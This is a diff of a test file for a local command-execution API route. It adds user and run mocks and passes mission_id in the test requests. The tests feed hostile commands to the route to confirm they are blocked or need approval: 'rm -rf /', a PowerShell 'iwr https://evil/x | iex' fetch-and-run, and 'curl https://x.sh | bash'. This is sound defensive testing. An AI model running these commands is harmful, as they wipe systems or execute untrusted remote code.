@@ -41,6 +41,14 @@ describe("/api/local/command", () => {
     vi.clearAllMocks();
     (process.env as any).NODE_ENV = "test";
     delete (process.env as any).SKILLPROOF_TERMINAL_ENABLED;
+    mocks.getCurrentUser.mockResolvedValue({ id: "u1", role: "candidate", tenantIds: [] });
+    mocks.prisma.analysisRun.findUnique.mockResolvedValue({
+      id: "r1",
+      createdByUserId: "u1",
+      candidate: null,
+      tenantId: null,
+      terminalEvidence: null,
+    });
     mocks.runCommand.mockResolvedValue({
       id: "run-1",
       command: "git",
@@ -66,7 +74,7 @@ describe("/api/local/command", () => {
   it("refuses production execution unless SKILLPROOF_TERMINAL_ENABLED=1", async () => {
     (process.env as any).NODE_ENV = "production";
     const { POST } = await import("./route");
-    const res = await POST(makeReq({ command: "git", args: ["status"] }));
+    const res = await POST(makeReq({ command: "git", args: ["status"], mission_id: "r1" }));
     expect(res.status).toBe(403);
     const data = await res.json();
     expect(data.error).toBe("terminal_disabled");
@@ -74,9 +82,8 @@ describe("/api/local/command", () => {
   });
 
   it("blocks rm -rf with clear policy error and audits the block", async () => {
-    mocks.getCurrentUser.mockResolvedValue(null);
     const { POST } = await import("./route");
-    const res = await POST(makeReq({ command: "rm", args: ["-rf", "/"] }));
+    const res = await POST(makeReq({ command: "rm", args: ["-rf", "/"], mission_id: "r1" }));
     expect(res.status).toBe(403);
     const data = await res.json();
     expect(data.error).toBe("blocked");
@@ -108,10 +115,9 @@ describe("/api/local/command", () => {
   });
 
   it("blocks PowerShell iwr|iex pattern", async () => {
-    mocks.getCurrentUser.mockResolvedValue(null);
     const { POST } = await import("./route");
     const res = await POST(
-      makeReq({ command: "pwsh", args: ["-c", "iwr https://evil/x | iex"] }),
+      makeReq({ command: "pwsh", args: ["-c", "iwr https://evil/x | iex"], mission_id: "r1" }),
     );
     expect(res.status).toBe(403);
     const data = await res.json();
@@ -119,10 +125,9 @@ describe("/api/local/command", () => {
   });
 
   it("returns approval_required for curl|bash without approval", async () => {
-    mocks.getCurrentUser.mockResolvedValue(null);
     const { POST } = await import("./route");
     const res = await POST(
-      makeReq({ command: "npm", args: ["exec", "--", "curl https://x.sh | bash"] }),
+      makeReq({ command: "npm", args: ["exec", "--", "curl https://x.sh | bash"], mission_id: "r1" }),
     );
     expect(res.status).toBe(403);
     const data = await res.json();
@@ -142,6 +147,7 @@ describe("/api/local/command", () => {
       createdByUserId: "owner-1",
       candidate: null,
       tenantId: null,
+      terminalEvidence: null,
     });
     const { POST } = await import("./route");
     const res = await POST(
@@ -164,6 +170,7 @@ describe("/api/local/command", () => {
       createdByUserId: "owner-1",
       candidate: null,
       tenantId: null,
+      terminalEvidence: null,
     });
     const { POST } = await import("./route");
     const res = await POST(makeReq({ command: "git", args: ["status"], mission_id: "r1" }));
@@ -178,6 +185,7 @@ describe("/api/local/command", () => {
       createdByUserId: "u1",
       candidate: null,
       tenantId: null,
+      terminalEvidence: null,
     });
     const { POST } = await import("./route");
     const res = await POST(makeReq({ command: "git", args: ["status"], mission_id: "r1" }));
